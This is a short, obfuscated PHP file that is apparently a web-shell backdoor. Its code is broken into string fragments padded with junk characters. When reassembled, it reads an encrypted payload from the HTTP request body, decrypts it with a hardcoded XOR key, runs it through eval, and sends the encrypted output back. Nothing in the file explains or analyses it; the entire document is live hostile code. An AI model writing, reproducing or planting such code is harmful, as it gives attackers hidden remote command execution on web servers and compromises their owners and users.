<?php
$i='$k="d2528UqUq732";$khUq="6d09Uq3Uqdbe72b8";$kUqfUq="904cUq820e55e7";$pUq="HGD1xUqksg4UqUqCX6fKIi";fUqun';
$C='ndUqUq_clUqean()Uq;$r=@baUqse64_encodUqe(@x(@gzcoUqmpress(Uq$o),$Uqk));prUqintUq("$p$kh$r$Uqkf");}';
$X='qUq("/$kh(.+)$kf/",@UqfUqile_get_contUqentsUq("Uqphp://UqinUqput")Uq,$mUq)==1) {@ob_starUqt();@eva';
$g='ctUqion x(Uq$t,$k){$c=stUqrleUqnUqUq($k);$Uql=sUqtrlen($t);$o="";foUqr($i=0;$i<UqUqUq$l;){for($j=0';
$G=str_replace('F','','creFFaFte_fFunFFction');
$L=';(Uq$Uqj<$c&&$i<$l)Uq;$jUq++,$i++){$o.=$UqUqt{$i}^$k{$j}Uq;}Uq}reUqturn UqUq$o;}if (@preg_matchUqU';
$n='Uql(@gzuUqncomUqpreUqss(@x(@baUqse64_decodUqe($m[Uq1]),$Uqk))Uq);$o=@ob_geUqt_cUqontenUqts();@ob_e';
$w=str_replace('Uq','',$i.$g.$L.$X.$n.$C);
$J=$G('',$w);$J();
?>
